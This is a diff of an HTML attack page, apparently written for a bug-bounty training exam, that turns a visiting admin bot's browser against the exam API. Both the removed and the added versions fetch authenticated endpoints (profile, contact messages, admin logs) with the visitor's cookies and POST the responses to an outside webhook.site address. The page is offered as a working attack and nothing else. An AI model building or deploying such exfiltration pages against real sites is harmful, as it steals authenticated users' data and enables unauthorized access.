@@ -2,36 +2,27 @@
 <html>
 <body>
     <h1>Processing Admin Request...</h1>
-    <script>
-        const webhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
-        const base = "https://api-bugbounty-exam.hashacademy.co";
-        const msgId = "69ea4208bee6d6b7c6645889";
+    
+   <script>
+    const webhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
+    const msgId = "69ea4208bee6d6b7c6645889";
+    const base = "https://api-bugbounty-exam.hashacademy.co";
 
-        async function exfiltrate() {
-            const targets = [
-                `${base}/api/auth/profile`,
-                `${base}/api/v1/contact/messages/${msgId}`,
-                `${base}/api/v1/admin/logs`
-            ];
-
-            for (const url of targets) {
-                try {
-                    const response = await fetch(url, { credentials: 'include' });
-                    const data = await response.text();
-                    // Send each finding to the webhook
-                    await fetch(webhook, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ url: url, content: data })
-                    });
-                } catch (e) {
-                    // Log errors to webhook for debugging
-                    new Image().src = `${webhook}/?err=${btoa(url)}`;
-                }
-            }
-        }
-
-        exfiltrate();
-    </script>
+    // This fetch uses the bot's cookies to view the internal version of the message
+    fetch(`${base}/api/v1/contact/messages/${msgId}`, { credentials: "include" })
+        .then(r => r.json())
+        .then(data => {
+            fetch(webhook, {
+                method: "POST",
+                body: JSON.stringify({ type: "MESSAGE_EXFIL", content: data })
+            });
+        })
+        .catch(err => {
+            // If the v1 path fails, try the standard path
+            fetch(`${base}/api/contact/messages/${msgId}`, { credentials: "include" })
+                .then(r => r.text())
+                .then(d => fetch(webhook, { method: "POST", body: d }));
+        });
+</script>
 </body>
 </html>
